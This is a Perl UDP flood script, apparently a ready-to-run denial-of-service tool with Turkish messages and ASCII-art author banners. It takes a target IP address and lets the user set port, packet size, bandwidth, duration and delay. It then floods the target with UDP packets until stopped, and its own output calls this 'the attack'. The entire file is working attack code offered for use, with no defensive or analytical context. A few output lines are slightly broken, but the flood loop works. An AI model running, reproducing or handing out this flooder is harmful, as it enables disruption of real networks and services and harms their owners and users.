#!/usr/bin/perl
#####################################################
# Created by cimidi & Papazchavo.
#

# ▄████▄   ██▓ ███▄ ▄███▓ ██▓▓█████▄  ██▓
#▒██▀ ▀█  ▓██▒▓██▒▀█▀ ██▒▓██▒▒██▀ ██▌▓██▒
#▒▓█    ▄ ▒██▒▓██    ▓██░▒██▒░██   █▌▒██▒
#▒▓▓▄ ▄██▒░██░▒██    ▒██ ░██░░▓█▄   ▌░██░
#▒ ▓███▀ ░░██░▒██▒   ░██▒░██░░▒████▓ ░██░
#░ ░▒ ▒  ░░▓  ░ ▒░   ░  ░░▓   ▒▒▓  ▒ ░▓  
#  ░  ▒    ▒ ░░  ░      ░ ▒ ░ ░ ▒  ▒  ▒ ░
#░         ▒ ░░      ░    ▒ ░ ░ ░  ░  ▒ ░
#░ ░       ░         ░    ░     ░     ░  
#░                            ░          
#
#                                                                         
#
######################################################

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(

	"port=i" => \$port,    #Kullanılacak UDP portu, sayısal, 0=rastgele
	"size=i" => \$size,		 #Paket boyutu, sayı, 0=rastgele
	"bandwidth=i" => \$bw, #Tüketilecek bant genişliği
	"time=i" => \$time,	   #Çalışma süresi
	"delay=f"=> \$delay,   #Paketler arası gecikme
	"help|?" => \$help);	 #Yardım

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';
 Komutun kullanımı: perl cqHack.pl a.b.c.d
EOL
  exit(1);
}

if ($bw && $delay) {
  print "UYARI: Paket boyutu parametreyi geçersiz kılıyor - komut yok sayılacak\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 700 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "hostname çözümlenemiyor, yeniden deneyin. $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

printf "[0;32m>> Made by cimidi & Papazchavo.  \n";
printf "[0;32m>>  
 ██████ ██ ███    ███ ██ ██████  ██ 
██      ██ ████  ████ ██ ██   ██ ██ 
██      ██ ██ ████ ██ ██ ██   ██ ██ 
██      ██ ██  ██  ██ ██ ██   ██ ██ 
 ██████ ██ ██      ██ ██ ██████  ██ 
 
                                      
                                    \n";
printf "[0;31m>> IP adresi hedefleniyor.    \n";
printf "[0;36m>> Port hedefleniyor.     \n";
($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
print "Paketler arası gecikme $delay gecikmesi milisaniye\n" if $delay;
print "Toplam IP bant genişliği $bw kbps\n" if $bw;
printf "[1;31m>> Saldırıyı durdurmak için CTRL + C tuşlarına basınız.  \n" unless $time;

die "Geçersiz paket boyutu: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}